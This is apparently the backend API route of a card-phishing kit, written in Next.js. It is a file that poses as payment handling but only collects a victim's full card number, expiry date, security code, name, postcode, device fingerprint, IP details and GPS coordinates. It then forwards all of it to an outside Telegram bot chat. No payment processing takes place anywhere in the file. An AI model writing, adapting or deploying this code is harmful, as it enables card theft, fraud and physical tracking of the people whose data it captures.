import { type NextRequest, NextResponse } from "next/server"
import { detectCardInfo, getCardTypeName, getCardLevelName, formatBIN } from "../../lib/bin-detection"

export async function POST(request: NextRequest) {
  try {
    const { cardNumber, expiryDate, securityCode, country, postcode, fullName, deviceInfo, locationInfo, ipInfo } =
      await request.json()

    // Detect card information
    const cardInfo = detectCardInfo(cardNumber)
    const bin = formatBIN(cardNumber)

    // Telegram Bot configuration
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Telegram credentials not configured")
      return NextResponse.json({ success: false, error: "Configuration error" })
    }

    let message = `💳 <b>New Payment Information Submitted:</b>

📋 <b>Card Details:</b>
💳 Card Number: ${cardNumber}
📅 Expiry Date: ${expiryDate}
🔒 Security Code: ${securityCode}

🏦 <b>Card Information:</b>
🔍 BIN: ${bin}
💳 Card Type: ${getCardTypeName(cardInfo.type)}
⭐ Card Level: ${getCardLevelName(cardInfo.level)}
🏦 Bank: ${cardInfo.bank}
🌍 Country: ${cardInfo.country}

📍 <b>Billing Information:</b>
🌍 Country: ${country}
📮 Postcode: ${postcode}
👤 Full Name: ${fullName}

⏰ Time: ${new Date().toLocaleString()}`

    // Add device information
    if (deviceInfo) {
      message += `

🖥️ <b>Device Information:</b>
🌐 Browser: ${deviceInfo.browser} ${deviceInfo.browserVersion}
💻 OS: ${deviceInfo.os} ${deviceInfo.osVersion}
📱 Device: ${deviceInfo.device}
📺 Screen: ${deviceInfo.screen.width}x${deviceInfo.screen.height}
🌍 Language: ${deviceInfo.language}
⏰ Timezone: ${deviceInfo.timezone}`
    }

    // Add IP and location information
    if (ipInfo) {
      message += `

📍 <b>Location Information:</b>
🌐 IP Address: ${ipInfo.ip}
🏙️ City: ${ipInfo.city}
🗺️ Region: ${ipInfo.region}
🌍 Country: ${ipInfo.country} (${ipInfo.countryCode})
🏢 ISP: ${ipInfo.isp}`
    }

    // Add GPS coordinates if available
    if (locationInfo && locationInfo.latitude && locationInfo.longitude) {
      message += `

🎯 <b>GPS Coordinates:</b>
📍 Location: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}
🎯 Accuracy: ${locationInfo.accuracy}m
🗺️ Google Maps: https://maps.google.com/?q=${locationInfo.latitude},${locationInfo.longitude}`
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (response.ok) {
      return NextResponse.json({ success: true })
    } else {
      console.error("Failed to send to Telegram:", await response.text())
      return NextResponse.json({ success: false, error: "Failed to send message" })
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ success: false, error: "Server error" })
  }
}
